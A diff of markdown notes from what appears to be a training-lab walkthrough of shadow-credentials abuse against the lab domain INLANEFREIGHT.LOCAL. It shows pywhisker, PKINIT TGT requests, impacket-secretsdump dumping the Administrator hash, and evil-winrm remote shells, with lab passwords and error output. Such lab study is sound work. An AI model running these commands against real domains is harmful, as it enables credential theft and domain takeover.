@@ -75,7 +75,7 @@ Once a TGT is obtained....
 export KRB5CCNAME=/tmp/dc.ccache
 ```
 
- ```go
+```go
 impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
 ```
 
@@ -101,7 +101,8 @@ pywhisker --dc-ip 10.129.234.109 -d INLANEFREIGHT.LOCAL -u wwhite -p 'package5sh
 | -p               |             |
 | --target         |             |
 | --action         |             |
-
+```
+```
 ###### Output: Note the PFX file and the password
 ```go
 [*] Searching for the target account
@@ -156,7 +157,7 @@ DC01
 
 CA01
 ```go
-10.129.234.172
+10.129.3.0
 ```
 
 Username
@@ -179,7 +180,7 @@ What are the contents of flag.txt on jpinkman's desktop?
 Perform an NMAP Host scan to determine which is the server to coerce
 
 ```go
-nmap -sV -A -sC -Pn 10.129.234.174 10.129.94.225 -oA results
+nmap -sV -A -sC -Pn 10.129.234.174 10.129.3.0 -oA results
 ```
 
 >[!TIP] HARDCODE IP ADDRESSES OF THE DOMAIN AND TARGET MACHINES!
@@ -194,17 +195,17 @@ python3 pywhisker.py --dc-ip 10.129.234.174 -d INLANEFREIGHT.LOCAL -u wwhite -p 
 
 Password
 ```go
-v2W8NAWvyqMmyoimuSyn
+hQasUO7dqGBVmcFIGFKA
 ```
 
 PFX Certificate
 ```go
-5k0H4C2e.pfx
+zz4BA4ql.pfx
 ```
 
 Now use gettgtpkinit.py to get the TGT as the target
 ```go
-python3 gettgtpkinit.py -cert-pfx 5k0H4C2e.pfx -pfx-pass 'v2W8NAWvyqMmyoimuSyn' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
+python3 ../../PKINITtools/gettgtpkinit.py -cert-pfx zz4BA4ql.pfx -pfx-pass 'hQasUO7dqGBVmcFIGFKA' -dc-ip 10.129.234.174 INLANEFREIGHT.LOCAL/jpinkman /tmp/jpinkman.ccache
 ```
 
 
@@ -216,8 +217,31 @@ export KRB5CCNAME=/tmp/jpinkman.ccache
 ```
 
 ```go
-proxychains evil-winrm -i dc01.inlanefrieght.htb -r inlanefreight.htb
+evil-winrm -i dc01.inlanefreight.local -r inlanefreight.local
 ```
+
+```go
+impacket-secretsdump -k -no-pass -dc-ip 10.129.234.174 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
+```
+
+>[!Error] Error When Running evil-winrm with proxychains
+> Evil-WinRM shell v3.9
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+>
+>Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+>
+> Info: Establishing connection to remote endpoint
+> 
+> Error: An error of type GSSAPI::GssApiError happened, message is gss_init_sec_context did not return GSS_S_COMPLETE: Unspecified GSS failure.  Minor code may provide more information
+Cannot find KDC for realm "INLANEFREIGHT.LOCAL"
+>
+>
+>
+>
+>
+>
+>
+
 
 #### Question 2
 What are the contents of the flag.txt on Administrators desktop?
